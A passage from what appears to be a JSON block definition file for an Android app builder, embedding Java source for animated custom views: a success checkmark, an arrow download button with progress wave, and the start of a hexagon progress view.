RectF leftRect \u003d new RectF();\r\n        if (mLeftRectWidth \u003e 0) {\r\n            leftRect.left \u003d (totalW - CONST_LEFT_RECT_W) / 2 + CONST_RECT_WEIGHT;\r\n            leftRect.right \u003d leftRect.left + dip2px(mLeftRectWidth);\r\n            leftRect.top \u003d (totalH + CONST_RIGHT_RECT_W) / 2;\r\n            leftRect.bottom \u003d leftRect.top + CONST_RECT_WEIGHT;\r\n            canvas.drawRoundRect(leftRect, CONST_RADIUS, CONST_RADIUS, mPaint);\r\n        }\r\n        if (mRightRectWidth \u003e 0) {\r\n            RectF rightRect \u003d new RectF();\r\n            rightRect.bottom \u003d (totalH + CONST_RIGHT_RECT_W) / 2 + CONST_RECT_WEIGHT - 1;\r\n            rightRect.left \u003d (totalW + CONST_LEFT_RECT_W) / 2;\r\n            rightRect.right \u003d rightRect.left + CONST_RECT_WEIGHT;\r\n            rightRect.top \u003d rightRect.bottom - dip2px(mRightRectWidth);\r\n            canvas.drawRoundRect(rightRect, CONST_RADIUS, CONST_RADIUS, mPaint);\r\n        }\r\n        super.onDraw(canvas);\r\n    }\r\n    @Override\r\n    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\r\n        int widthMode \u003d MeasureSpec.getMode(widthMeasureSpec);\r\n        int widthSize \u003d MeasureSpec.getSize(widthMeasureSpec);\r\n        int heightMode \u003d MeasureSpec.getMode(heightMeasureSpec);\r\n        int heightSize \u003d MeasureSpec.getSize(heightMeasureSpec);\r\n        int width;\r\n        int height;\r\n        if (widthMode \u003d\u003d MeasureSpec.EXACTLY) {\r\n            width \u003d widthSize;\r\n        } else {\r\n            width \u003d (int) (getPaddingLeft() + minWidth + getPaddingRight());\r\n        }\r\n        if (heightMode \u003d\u003d MeasureSpec.EXACTLY) {\r\n            height \u003d heightSize;\r\n        } else {\r\n            height \u003d (int) (getPaddingTop() + minHeight + getPaddingBottom());\r\n        }\r\n        setMeasuredDimension(width, height);\r\n    }\r\n    public float dip2px(float dpValue) {\r\n        if (mDensity \u003d\u003d -1) {\r\n            mDensity \u003d getResources().getDisplayMetrics().density;\r\n        }\r\n        return dpValue * mDensity + 0.5f;\r\n    }\r\n    public void startAnim(int startDelay) {\r\n        clearAnimation();\r\n        ValueAnimator animator \u003d ValueAnimator.ofFloat(0, 60f, 120f, 180f, 240f, 300f, 360f, 375f, 400f);\r\n        animator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\r\n            @Override\r\n            public void onAnimationUpdate(ValueAnimator valueAnimator) {\r\n                float value \u003d (float) valueAnimator.getAnimatedValue();\r\n                angle \u003d -value;\r\n                if (value\u003e360 \u0026\u0026 value\u003c\u003d375){\r\n                    mLeftRectWidth \u003d value - 360;\r\n                }else if(value\u003e375){\r\n                    mRightRectWidth \u003d value - 375;\r\n                }\r\n                invalidate();\r\n            }\r\n        });\r\n        animator.setDuration(1000);\r\n        animator.setInterpolator(new android.view.animation.LinearInterpolator());\r\n        animator.setStartDelay(startDelay);\r\n        animator.start();\r\n    }\r\n}\n{","name":"SuccessViewLib","palette":"96","type":" ","spec":"##SuccessViewLib (add to Mblock)##"},{"code":"SuccessView %1$s \u003d new SuccessView(this);\r\n%1$s.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT));\r\n%1$s.startAnim(200);\r\n%1$s.setColor(Color.parseColor(\"#FF0000\"));\r\n%1$s.setStrokeWidth(5);\r\n%2$s.addView(%1$s);","name":"SuccessView","palette":"96","type":" ","spec":"SuccessView ID %s.inputOnly on %m.view"},{"code":"}\nprivate int count;\r\nprivate int progress;\r\n\r\npublic static class ArrowDownloadButton extends View {\r\n\r\n    private static final int BLUE_ONE \u003d Color.rgb(46, 164, 242);\r\n    private static final int WHILE \u003d Color.rgb(255, 255, 255);\r\n    private static final float RADIUS \u003d 180;\r\n    private static final int TRI_POINT_NUMBER \u003d 17;\r\n    private static final float MAX_WAVE_HEIGHT \u003d 10;\r\n    private static final float MIN_WAVE_HEIGHT \u003d 5;\r\n    private static final int PROGRESS \u003d 100;\r\n    private static final int ANGLE \u003d 360;\r\n    private static final float TEXT_Y \u003d 67.5f;\r\n    private static final float OFFSET \u003d 10;\r\n    private static final float SMALL_RADIUS \u003d 5;\r\n    private static final float TEXT_SIZE \u003d 40;\r\n    private static final float ARC_WIDTH \u003d 20;\r\n    private static final float ARROW_WIDTH \u003d 10;\r\n    private static final float TRI_WIDTH \u003d 10;\r\n    private static final float LOADING_WIDTH \u003d 10;\r\n\r\n    private static final float STEP \u003d 2;\r\n    private static final float ELASTICITY_STEP \u003d 10;\r\n    private static final float ROPE_STEP_X \u003d 30;\r\n    private static final float ROPE_STEP_Y \u003d 32;\r\n    private static final float ROPE_HEAD_STEP_Y \u003d 17;\r\n    private static final float JUMP_STEP \u003d 45;\r\n    private static final float DOWN_STEP \u003d 7.5f;\r\n    private static final float TRI_STEP \u003d 16.875f;\r\n    private static final float TIME_STEP \u003d 20;\r\n    private static final float HOOK_STEP_Y \u003d 15;\r\n    private static final float HOOK_COUNT \u003d 4;\r\n    private static final float LITTLE_STEP \u003d 8;\r\n    private static final int DURATION \u003d 20;\r\n    private static final int COMPLETE_DURATION \u003d 20;\r\n    private static final String INSTANCE_STATE \u003d \"instance_state\";\r\n    private static final String X_I \u003d \"x\";\r\n    private static final String Y_I \u003d \"y\";\r\n    private static final String RADIUS_I \u003d \"radius\";\r\n    private static final String MAX_WAVE_HEIGHT_I \u003d \"max_wave_height\";\r\n    private static final String MIN_WAVE_HEIGHT_I \u003d \"min_wave_height\";\r\n    private static final String TEXT_Y_I \u003d \"text_y\";\r\n    private static final String STEP_I \u003d \"step\";\r\n    private static final String ELASTICITY_STEP_I \u003d \"elasticity_step\";\r\n    private static final String ROPE_STEP_X_I \u003d \"rope_step_x\";\r\n    private static final String ROPE_STEP_Y_I \u003d \"rope_step_y\";\r\n    private static final String ROPE_HEAD_STEP_Y_I \u003d \"rope_head_step_y\";\r\n    private static final String JUMP_STEP_I \u003d \"jump_step\";\r\n    private static final String DOWN_STEP_I \u003d \"down_step\";\r\n    private static final String TRI_STEP_I \u003d \"tri_step\";\r\n    private static final String HOOK_STEP_Y_I \u003d \"hook_step\";\r\n    private static final String LITTLE_STEP_I \u003d \"little_step\";\r\n    private static final String SMALL_RADIUS_I \u003d \"small_radius\";\r\n    private static final String TEXT_SIZE_I \u003d \"text_size\";\r\n    private static final String ARC_WIDTH_I \u003d \"arc_width\";\r\n    private static final String ARROW_WIDTH_I \u003d \"arrow_width\";\r\n    private static final String TRI_WIDTH_I \u003d \"tri_width\";\r\n    private static final String LOADING_WIDTH_I \u003d \"loading_width\";\r\n    private static final String IS_FIRST_I \u003d \"is_first\";\r\n    private static final String IS_ANIMATING_I \u003d \"is_animating\";\r\n    private static final String BEZIER_I \u003d \"bezier\";\r\n    private static final String IS_LOADING_I \u003d \"is_loading\";\r\n    private static final String IS_COMPLETED_I \u003d \"is_completed\";\r\n    private static final String IS_END_I \u003d \"is_end\";\r\n    private static final String COUNT_I \u003d \"count\";\r\n    private static final String LENGTH_I \u003d \"length\";\r\n    private static final String CURRENT_TIME_I \u003d \"current_time\";\r\n    private static final String WAVE_HEIGHT_I \u003d \"wave_height\";\r\n    private static final String PROGRESS_I \u003d \"progress\";\r\n    private static final String HOOK_COUNT_I \u003d \"hook_count\";\r\n    private static final String LENGTH_X_I \u003d \"length_x\";\r\n    private static final String LENGTH_Y_I \u003d \"length_y\";\r\n\r\n\r\n    private float x \u003d 550;\r\n    private float y \u003d 550;\r\n    private float radius \u003d RADIUS;\r\n    private float maxWaveHeight \u003d MAX_WAVE_HEIGHT;\r\n    private float minWaveHeight \u003d MIN_WAVE_HEIGHT;\r\n    private float textY \u003d TEXT_Y;\r\n    private float step \u003d STEP;\r\n    private float elasticityStep \u003d ELASTICITY_STEP;\r\n    private float ropeStepX \u003d ROPE_STEP_X;\r\n    private float ropeStepY \u003d ROPE_STEP_Y;\r\n    private float ropeHeadStepY \u003d ROPE_HEAD_STEP_Y;\r\n    private float jumpStep \u003d JUMP_STEP;\r\n    private float downStep \u003d DOWN_STEP;\r\n    private float triStep \u003d TRI_STEP;\r\n    private float hookStepY \u003d HOOK_STEP_Y;\r\n    private float littleStep \u003d LITTLE_STEP;\r\n    private float smallRadius \u003d SMALL_RADIUS;\r\n    private float textSize \u003d TEXT_SIZE;\r\n    private float arcWidth \u003d ARC_WIDTH;\r\n    private float arrowWidth \u003d ARROW_WIDTH;\r\n    private float triWidth \u003d TRI_WIDTH;\r\n    private float loadingWidth \u003d LOADING_WIDTH;\r\n\r\n    private Paint arrowPaint;\r\n    private Paint arcPaint;\r\n    private Paint smallPaint;\r\n    private Paint triPaint;\r\n    private Paint loadingPaint;\r\n    private Paint textPaint;\r\n\r\n    private Path arrowPath;\r\n    private Path triPath;\r\n    private Path textPath;\r\n\r\n    private RectF oval;\r\n\r\n    private Point a;\r\n    private Point b;\r\n    private Point c;\r\n    private Point d;\r\n    private Point e;\r\n    private Point jumpPoint;\r\n\r\n    private List\u003cPoint\u003e triPoints \u003d new ArrayList\u003c\u003e();\r\n\r\n    private boolean isFirst \u003d true;\r\n    private boolean isAnimating \u003d false;\r\n    private boolean bezier \u003d false;\r\n    private boolean isLoading \u003d false;\r\n    private boolean isCompleted \u003d false;\r\n    private boolean isEnd \u003d false;\r\n    private int count \u003d 0;\r\n    private float length;\r\n    private int currentTime \u003d 0;\r\n    private float waveHeight \u003d MIN_WAVE_HEIGHT;\r\n    private float progress \u003d 0;\r\n    private int hookCount \u003d 0;\r\n    float lengthX \u003d 3 * radius / 4;\r\n    float lengthY \u003d 3 * radius / 4;\r\n\r\n    public float getProgress() {\r\n        return progress;\r\n    }\r\n\r\n    public void setProgress(float progress) {\r\n        if (progress \u003e 100) {\r\n            this.progress \u003d 100;\r\n        } else {\r\n            this.progress \u003d progress;\r\n        }\r\n\r\n        if (progress \u003d\u003d 100) {\r\n            isLoading \u003d false;\r\n            isCompleted \u003d true;\r\n        }\r\n    }\r\n\r\n    public ArrowDownloadButton(Context context) {\r\n        this(context, null);\r\n    }\r\n\r\n    public ArrowDownloadButton(Context context, AttributeSet attrs) {\r\n        this(context, attrs, 0);\r\n    }\r\n\r\n    public ArrowDownloadButton(Context context, AttributeSet attrs, int defStyleAttr) {\r\n        super(context, attrs, defStyleAttr);\r\n        init();\r\n    }\r\n\r\n    @Override\r\n    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {\r\n        setMeasuredDimension(measure(widthMeasureSpec, true), measure(heightMeasureSpec, false));\r\n    }\r\n\r\n    private int measure(int measureSpec, boolean isWidth) {\r\n        int result;\r\n        int mode \u003d MeasureSpec.getMode(measureSpec);\r\n        int size \u003d MeasureSpec.getSize(measureSpec);\r\n        int padding \u003d isWidth ? getPaddingLeft() + getPaddingRight() : getPaddingTop() + getPaddingBottom();\r\n        if (mode \u003d\u003d MeasureSpec.EXACTLY) {\r\n            result \u003d size;\r\n        } else {\r\n            result \u003d isWidth ? getSuggestedMinimumWidth() : getSuggestedMinimumHeight();\r\n            result +\u003d padding;\r\n            if (mode \u003d\u003d MeasureSpec.AT_MOST) {\r\n                if (isWidth) {\r\n                    result \u003d Math.max(result, size);\r\n                } else {\r\n                    result \u003d Math.min(result, size);\r\n                }\r\n            }\r\n        }\r\n        return result;\r\n    }\r\n\r\n    @Override\r\n    protected void onDraw(Canvas canvas) {\r\n        if (isFirst) {\r\n            init();\r\n            isFirst \u003d false;\r\n        }\r\n        canvas.drawCircle(x, y, radius, arcPaint);\r\n        drawArrow(canvas);\r\n        if (isAnimating) {\r\n            animating();\r\n        }\r\n        if (isLoading) {\r\n            loading(canvas);\r\n        }\r\n        if (isCompleted) {\r\n            afterCompleted(canvas);\r\n        }\r\n    }\r\n\r\n    private void init() {\r\n        float temp \u003d getHeight() \u003e getWidth() ? getWidth() / 2 : getHeight() / 2;\r\n        radius \u003d temp - temp * OFFSET / RADIUS - temp * ELASTICITY_STEP / RADIUS - 6;\r\n        x \u003d getPaddingLeft() + getWidth() / 2;\r\n        y \u003d getPaddingTop() + getHeight() / 2;\r\n        maxWaveHeight \u003d convert(MAX_WAVE_HEIGHT);\r\n        minWaveHeight \u003d convert(MIN_WAVE_HEIGHT);\r\n        textY \u003d convert(TEXT_Y);\r\n        step \u003d convert(STEP);\r\n        elasticityStep \u003d convert(ELASTICITY_STEP);\r\n        ropeStepX \u003d convert(ROPE_STEP_X);\r\n        ropeStepY \u003d convert(ROPE_STEP_Y);\r\n        ropeHeadStepY \u003d convert(ROPE_HEAD_STEP_Y);\r\n        jumpStep \u003d convert(JUMP_STEP);\r\n        downStep \u003d convert(DOWN_STEP);\r\n        triStep \u003d convert(TRI_STEP);\r\n        hookStepY \u003d convert(HOOK_STEP_Y);\r\n        littleStep \u003d convert(LITTLE_STEP);\r\n        smallRadius \u003d convert(SMALL_RADIUS);\r\n        textSize \u003d convert(TEXT_SIZE);\r\n        arcWidth \u003d convert(ARC_WIDTH);\r\n        arrowWidth \u003d convert(ARROW_WIDTH);\r\n        triWidth \u003d convert(TRI_WIDTH);\r\n        loadingWidth \u003d convert(LOADING_WIDTH);\r\n        lengthX \u003d 3 * radius / 4;\r\n        lengthY \u003d 3 * radius / 4;\r\n\r\n        arrowPath \u003d new Path();\r\n        triPath \u003d new Path();\r\n        textPath \u003d new Path();\r\n        oval \u003d new RectF();\r\n        oval.left \u003d x - radius;\r\n        oval.top \u003d y - radius;\r\n        oval.right \u003d x + radius;\r\n        oval.bottom \u003d y + radius;\r\n        length \u003d radius / 2;\r\n        initializePaints();\r\n        initializePoints();\r\n    }\r\n    public void startAnimating() {\r\n        isAnimating \u003d true;\r\n        invalidate();\r\n    }\r\n    public void reset() {\r\n        isAnimating \u003d false;\r\n        isLoading \u003d false;\r\n        bezier \u003d false;\r\n        isCompleted \u003d false;\r\n        isEnd \u003d false;\r\n        length \u003d radius / 2;\r\n        count \u003d 0;\r\n        hookCount \u003d 0;\r\n        jumpPoint.x \u003d -1;\r\n        progress \u003d 0;\r\n        lengthX \u003d 3 * radius / 4;\r\n        lengthY \u003d 3 * radius / 4;\r\n        a.y \u003d y + length;\r\n        b.y \u003d y - length;\r\n        e.y \u003d y + length;\r\n        c.x \u003d x - length / 2;\r\n        c.y \u003d y + length / 2;\r\n        d.x \u003d x + length / 2;\r\n        d.y \u003d y + length / 2;\r\n        invalidate();\r\n    }\r\n    public void animating() {\r\n        if (count \u003c 19) {\r\n            length \u003d length * 3 / 4;\r\n            a.y \u003d y + length;\r\n            b.y \u003d y - length;\r\n\r\n            if (((count + 1) % 3) \u003d\u003d 0 \u0026\u0026 count \u003c 9) {\r\n                e.y \u003d e.y + step;\r\n                c.y \u003d c.y + step;\r\n                d.y \u003d d.y + step;\r\n            }\r\n            if (count \u003e 8 \u0026\u0026 count \u003c 12) {\r\n                jumpPoint.x \u003d x;\r\n                jumpPoint.y \u003d y - jumpStep * (count - 8);\r\n                c.x \u003d c.x - ropeStepX;\r\n                c.y \u003d c.y - ropeHeadStepY;\r\n                d.x \u003d d.x + ropeStepX;\r\n                d.y \u003d d.y - ropeHeadStepY;\r\n                e.y \u003d e.y - ropeStepY;\r\n            }\r\n            if (count \u003e 11) {\r\n                bezier \u003d true;\r\n                if (count \u003d\u003d 12) {\r\n                    jumpPoint.y \u003d jumpPoint.y - jumpStep * 2;\r\n                } else {\r\n                    jumpPoint.y \u003d jumpPoint.y + downStep;\r\n                    if (count \u003c 16) {\r\n                        int time1 \u003d 15 - count;\r\n                        e.y \u003d y + time1 * elasticityStep;\r\n                    }\r\n                }\r\n            }\r\n            count++;\r\n            postInvalidateDelayed(DURATION);\r\n        } else {\r\n            isAnimating \u003d false;\r\n            bezier \u003d false;\r\n            if (progress !\u003d 100) {\r\n                isLoading \u003d true;\r\n            } else {\r\n                isLoading \u003d false;\r\n                isCompleted \u003d true;\r\n            }\r\n        }\r\n    }\r\n    private void loading(Canvas canvas) {\r\n        Point currentPoint \u003d triPoints.get(0);\r\n        Point nextPoint;\r\n        for (int i \u003d 0; i \u003c TRI_POINT_NUMBER; i++) {\r\n            Point p \u003d triPoints.get(i);\r\n            p.x \u003d (x - 3 * radius / 4) + triStep * i;\r\n            p.y \u003d y + calculateTri(TIME_STEP * i, currentTime);\r\n        }\r\n        for (int i \u003d 1; i \u003c TRI_POINT_NUMBER; i++) {\r\n            nextPoint \u003d triPoints.get(i);\r\n            triPath.reset();\r\n            triPath.moveTo(currentPoint.x, currentPoint.y);\r\n            triPath.lineTo(nextPoint.x, nextPoint.y);\r\n            canvas.drawCircle(nextPoint.x, nextPoint.y, smallRadius, smallPaint);\r\n            canvas.drawPath(triPath, triPaint);\r\n            currentPoint \u003d nextPoint;\r\n        }\r\n        textPath.moveTo(x - textSize, y + textY);\r\n        textPath.lineTo(x + textSize, y + textY);\r\n        canvas.drawTextOnPath((int) progress + \"%\", textPath, 0, 0, textPaint);\r\n        currentTime \u003d (int) (currentTime + TIME_STEP);\r\n        float sweepAngle \u003d (progress / PROGRESS * ANGLE);\r\n        canvas.drawArc(oval, 270, 0 - sweepAngle, false, loadingPaint);\r\n        postInvalidateDelayed(DURATION);\r\n    }\r\n    protected void drawArrow(Canvas canvas) {\r\n        if (jumpPoint.x !\u003d -1) {\r\n            canvas.drawCircle(jumpPoint.x, jumpPoint.y, smallRadius, smallPaint);\r\n        }\r\n        if (bezier) {\r\n            arrowPath.reset();\r\n            arrowPath.moveTo(c.x, c.y);\r\n            arrowPath.quadTo(e.x, e.y, d.x, d.y);\r\n            canvas.drawPath(arrowPath, arrowPaint);\r\n        }  else if (isLoading) {\r\n        } else if (isCompleted) {\r\n        }  else if (isEnd) {\r\n            canvas.drawCircle(x, y, radius, loadingPaint);\r\n            drawArrowOrHook(canvas);\r\n        } else {\r\n            arrowPath.reset();\r\n            arrowPath.moveTo(a.x, a.y);\r\n            arrowPath.lineTo(b.x, b.y);\r\n            canvas.drawPath(arrowPath, arrowPaint);\r\n\r\n            canvas.drawCircle(a.x, a.y, smallRadius, smallPaint);\r\n            canvas.drawCircle(b.x, b.y, smallRadius, smallPaint);\r\n\r\n            drawArrowOrHook(canvas);\r\n\r\n        }\r\n    }\r\n    private void drawArrowOrHook(Canvas canvas) {\r\n        arrowPath.reset();\r\n        arrowPath.moveTo(e.x, e.y);\r\n        arrowPath.lineTo(c.x, c.y);\r\n        canvas.drawPath(arrowPath, arrowPaint);\r\n        arrowPath.reset();\r\n        arrowPath.moveTo(e.x, e.y);\r\n        arrowPath.lineTo(d.x, d.y);\r\n        canvas.drawPath(arrowPath, arrowPaint);\r\n\r\n        canvas.drawCircle(c.x, c.y, smallRadius, smallPaint);\r\n        canvas.drawCircle(d.x, d.y, smallRadius, smallPaint);\r\n        canvas.drawCircle(e.x, e.y, smallRadius, smallPaint);\r\n    }\r\n    private void afterCompleted(Canvas canvas) {\r\n        canvas.drawCircle(x, y, radius, loadingPaint);\r\n        if (hookCount \u003d\u003d HOOK_COUNT - 1) {\r\n            e.y \u003d e.y + littleStep;\r\n            c.x \u003d c.x - littleStep;\r\n            d.x \u003d d.x + littleStep;\r\n            d.y \u003d d.y - littleStep;\r\n            isCompleted \u003d false;\r\n            isEnd \u003d true;\r\n        } else {\r\n            e.x \u003d x;\r\n            e.y \u003d y + hookStepY * (hookCount + 1);\r\n            lengthX \u003d lengthX * 3 / 4;\r\n            c.x \u003d x - lengthX * 3 / 4;\r\n            c.y \u003d y;\r\n            d.x \u003d x + lengthY - radius / (float) 8 * (hookCount + 1);\r\n            d.y \u003d y - hookStepY * (hookCount + 1);\r\n            hookCount++;\r\n        }\r\n        drawArrowOrHook(canvas);\r\n        postInvalidateDelayed(COMPLETE_DURATION);\r\n\r\n    }\r\n\r\n    protected void initializePaints() {\r\n        arcPaint \u003d new Paint();\r\n        arcPaint.setAntiAlias(true);\r\n        arcPaint.setStyle(Paint.Style.STROKE);\r\n        arcPaint.setStrokeWidth(arcWidth);\r\n        arcPaint.setColor(BLUE_ONE);\r\n\r\n        arrowPaint \u003d new Paint();\r\n        arrowPaint.setAntiAlias(true);\r\n        arrowPaint.setStyle(Paint.Style.STROKE);\r\n        arrowPaint.setStrokeWidth(arrowWidth);\r\n        arrowPaint.setColor(WHILE);\r\n\r\n        smallPaint \u003d new Paint();\r\n        smallPaint.setAntiAlias(true);\r\n        smallPaint.setStyle(Paint.Style.FILL);\r\n        smallPaint.setColor(WHILE);\r\n\r\n        triPaint \u003d new Paint();\r\n        triPaint.setAntiAlias(true);\r\n        triPaint.setStyle(Paint.Style.STROKE);\r\n        triPaint.setStrokeWidth(triWidth);\r\n        triPaint.setColor(WHILE);\r\n\r\n        loadingPaint \u003d new Paint();\r\n        loadingPaint.setAntiAlias(true);\r\n        loadingPaint.setStyle(Paint.Style.STROKE);\r\n        loadingPaint.setStrokeWidth(loadingWidth);\r\n        loadingPaint.setColor(WHILE);\r\n\r\n        textPaint \u003d new Paint();\r\n        textPaint.setAntiAlias(true);\r\n        textPaint.setStyle(Paint.Style.FILL);\r\n        textPaint.setStrokeWidth(1);\r\n        textPaint.setColor(WHILE);\r\n        textPaint.setTextSize(textSize);\r\n    }\r\n\r\n    protected void initializePoints() {\r\n        a \u003d new Point(x, y + radius / 2);\r\n        b \u003d new Point(x, y - radius / 2);\r\n        c \u003d new Point(x - radius / 4, y + radius / 4);\r\n        d \u003d new Point(x + radius / 4, y + radius / 4);\r\n        e \u003d new Point(x, y + radius / 2);\r\n        jumpPoint \u003d new Point();\r\n\r\n        for (int i \u003d 0; i \u003c TRI_POINT_NUMBER; i++) {\r\n            Point point \u003d new Point();\r\n            point.x \u003d (x - 3 * radius / 4) + triStep * i;\r\n            point.y \u003d y + calculateTri(TIME_STEP * i, 0);\r\n            triPoints.add(point);\r\n        }\r\n    }\r\n    private float calculateTri(float originalTime, float currentTime) {\r\n        if (progress \u003c PROGRESS / 3) {\r\n            waveHeight \u003d MIN_WAVE_HEIGHT;\r\n        } else if (progress \u003c PROGRESS * 2 / 3) {\r\n            waveHeight \u003d maxWaveHeight;\r\n        } else {\r\n            waveHeight \u003d minWaveHeight;\r\n        }\r\n        return (float) (waveHeight * Math.sin((Math.PI / 80) * (originalTime + currentTime)));\r\n    }\r\n\r\n    private float convert(float original) {\r\n        return radius * original / RADIUS;\r\n    }\r\n\r\n    @Override\r\n    protected Parcelable onSaveInstanceState() {\r\n        final Bundle bundle \u003d new Bundle();\r\n        bundle.putParcelable(INSTANCE_STATE, super.onSaveInstanceState());\r\n        bundle.putFloat(X_I, x);\r\n        bundle.putFloat(Y_I, y);\r\n        bundle.putFloat(RADIUS_I, radius);\r\n        bundle.putFloat(MAX_WAVE_HEIGHT_I, maxWaveHeight);\r\n        bundle.putFloat(MIN_WAVE_HEIGHT_I, minWaveHeight);\r\n        bundle.putFloat(TEXT_Y_I, textY);\r\n        bundle.putFloat(STEP_I, step);\r\n        bundle.putFloat(ELASTICITY_STEP_I, elasticityStep);\r\n        bundle.putFloat(ROPE_STEP_X_I, ropeStepX);\r\n        bundle.putFloat(ROPE_STEP_Y_I, ropeStepY);\r\n        bundle.putFloat(ROPE_HEAD_STEP_Y_I, ropeHeadStepY);\r\n        bundle.putFloat(JUMP_STEP_I, jumpStep);\r\n        bundle.putFloat(DOWN_STEP_I, downStep);\r\n        bundle.putFloat(TRI_STEP_I, triStep);\r\n        bundle.putFloat(HOOK_STEP_Y_I, hookStepY);\r\n        bundle.putFloat(LITTLE_STEP_I, littleStep);\r\n        bundle.putFloat(SMALL_RADIUS_I, smallRadius);\r\n        bundle.putFloat(TEXT_SIZE_I, textSize);\r\n        bundle.putFloat(ARC_WIDTH_I, arcWidth);\r\n        bundle.putFloat(ARROW_WIDTH_I, arrowWidth);\r\n        bundle.putFloat(TRI_WIDTH_I, triWidth);\r\n        bundle.putFloat(LOADING_WIDTH_I, loadingWidth);\r\n        bundle.putBoolean(IS_FIRST_I, isFirst);\r\n        bundle.putBoolean(IS_ANIMATING_I, isAnimating);\r\n        bundle.putBoolean(BEZIER_I, bezier);\r\n        bundle.putBoolean(IS_LOADING_I, isLoading);\r\n        bundle.putBoolean(IS_COMPLETED_I, isCompleted);\r\n        bundle.putBoolean(IS_END_I, isEnd);\r\n        bundle.putInt(COUNT_I, count);\r\n        bundle.putFloat(LENGTH_I, length);\r\n        bundle.putInt(CURRENT_TIME_I, currentTime);\r\n        bundle.putFloat(WAVE_HEIGHT_I, waveHeight);\r\n        bundle.putFloat(PROGRESS_I, progress);\r\n        bundle.putInt(HOOK_COUNT_I, hookCount);\r\n        bundle.putFloat(LENGTH_X_I, lengthX);\r\n        bundle.putFloat(LENGTH_Y_I, lengthY);\r\n        return bundle;\r\n    }\r\n\r\n    @Override\r\n    protected void onRestoreInstanceState(Parcelable state) {\r\n        if (state instanceof Bundle) {\r\n            final Bundle bundle \u003d (Bundle) state;\r\n            x \u003d bundle.getFloat(X_I);\r\n            y \u003d bundle.getFloat(Y_I);\r\n            radius \u003d bundle.getFloat(RADIUS_I);\r\n            maxWaveHeight \u003d bundle.getFloat(MAX_WAVE_HEIGHT_I);\r\n            minWaveHeight \u003d bundle.getFloat(MIN_WAVE_HEIGHT_I);\r\n            textY \u003d bundle.getFloat(TEXT_Y_I);\r\n            step \u003d bundle.getFloat(STEP_I);\r\n            elasticityStep \u003d bundle.getFloat(ELASTICITY_STEP_I);\r\n            ropeStepX \u003d bundle.getFloat(ROPE_STEP_X_I);\r\n            ropeStepY \u003d bundle.getFloat(ROPE_STEP_Y_I);\r\n            ropeHeadStepY \u003d bundle.getFloat(ROPE_HEAD_STEP_Y_I);\r\n            jumpStep \u003d bundle.getFloat(JUMP_STEP_I);\r\n            downStep \u003d bundle.getFloat(DOWN_STEP_I);\r\n            triStep \u003d bundle.getFloat(TRI_STEP_I);\r\n            hookStepY \u003d bundle.getFloat(HOOK_STEP_Y_I);\r\n            littleStep \u003d bundle.getFloat(LITTLE_STEP_I);\r\n            smallRadius \u003d bundle.getFloat(SMALL_RADIUS_I);\r\n            textSize \u003d bundle.getFloat(TEXT_SIZE_I);\r\n            arcWidth \u003d bundle.getFloat(ARC_WIDTH_I);\r\n            arrowWidth \u003d bundle.getFloat(ARROW_WIDTH_I);\r\n            triWidth \u003d bundle.getFloat(TRI_WIDTH_I);\r\n            loadingWidth \u003d bundle.getFloat(LOADING_WIDTH_I);\r\n            isFirst \u003d bundle.getBoolean(IS_FIRST_I);\r\n            isAnimating \u003d bundle.getBoolean(IS_ANIMATING_I);\r\n            bezier \u003d bundle.getBoolean(BEZIER_I);\r\n            isLoading \u003d bundle.getBoolean(IS_LOADING_I);\r\n            isCompleted \u003d bundle.getBoolean(IS_COMPLETED_I);\r\n            isEnd \u003d bundle.getBoolean(IS_END_I);\r\n            count \u003d bundle.getInt(COUNT_I);\r\n            length \u003d bundle.getFloat(LENGTH_I);\r\n            currentTime \u003d bundle.getInt(CURRENT_TIME_I);\r\n            waveHeight \u003d bundle.getFloat(WAVE_HEIGHT_I);\r\n            progress \u003d bundle.getFloat(PROGRESS_I);\r\n            hookCount \u003d bundle.getInt(HOOK_COUNT_I);\r\n            lengthX \u003d bundle.getFloat(LENGTH_X_I);\r\n            lengthY \u003d bundle.getFloat(LENGTH_Y_I);\r\n        }\r\n        super.onRestoreInstanceState(state);\r\n    }\r\n\r\n    static class Point {\r\n        public float x;\r\n        public float y;\r\n\r\n        public Point(float x, float y) {\r\n            this.x \u003d x;\r\n            this.y \u003d y;\r\n        }\r\n\r\n        public Point() {\r\n            x \u003d -1;\r\n            y \u003d -1;\r\n        }\r\n    }\r\n}\n{","name":"ArrowLib","palette":"98","type":" ","spec":"##ArrowLib##"},{"code":"}\npublic static class HiveProgressView extends View {\r\n    private static final int[] rainbowColor \u003d {\r\n        0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x0000FF, 0x4B0082, 0x9400D3\r\n    };\r\n    private static final int MAX_PROGRESS_VALUE \u003d 1450;\r\n    private static final int PROGRESS_TIME \u003d 2000;\r\n    private static final int MAX_ALPHA \u003d 70;\r\n    private Paint paint \u003d new Paint();\r\n    private int hexHeight;\r\n    private int hexWidth;\r\n    private int hexPadding \u003d 0;\r\n    private float actualProgress \u003d 0;\r\n    private int maxAlpha \u003d MAX_ALPHA;\r\n    private int animationTime \u003d PROGRESS_TIME;\r\n    private int color;\r\n    private boolean rainbow;\r\n    private int cornerRadius;\r\n    private boolean shrink;\r\n    private AnimatorSet indeterminateAnimator;\r\n    public HiveProgressView(Context context) {\r\n        super(context);\r\n    }\r\n    public HiveProgressView(Context context, AttributeSet attrs) {\r\n        this(context, attrs, 0);\r\n    }\r\n    public HiveProgressView(Context context, AttributeSet attrs, int defStyle) {\r\n        super(context, attrs, defStyle);\r\n        initAttributes(attrs, defStyle);\r\n        initPaint();\r\n    }\r\n    private void initAttributes(AttributeSet attrs, int defStyle) {\r\n        animationTime \u003d PROGRESS_TIME;\r\n        maxAlpha \u003d MAX_ALPHA;\r\n        color \u003d Color.BLACK;\r\n        rainbow \u003d false;\r\n        shrink \u003d false;\r\n        cornerRadius \u003d 0;\r\n    }\r\n    public int getMaxAlpha() {\r\n        return maxAlpha;\r\n    }\r\n    public void setMaxAlpha(int maxAlpha) {\r\n        this.maxAlpha \u003d maxAlpha;\r\n    }\r\n    public int getAnimationTime() {\r\n        return animationTime;\r\n    }\r\n    public void setAnimationTime(int animationTime) {\r\n        this.animationTime \u003d animationTime;\r\n    }\r\n    public int getColor() {\r\n        return color;\r\n    }\r\n    public void setColor(int color) {\r\n        this.color \u003d color;\r\n    }\r\n    public boolean isRainbow() {\r\n        return 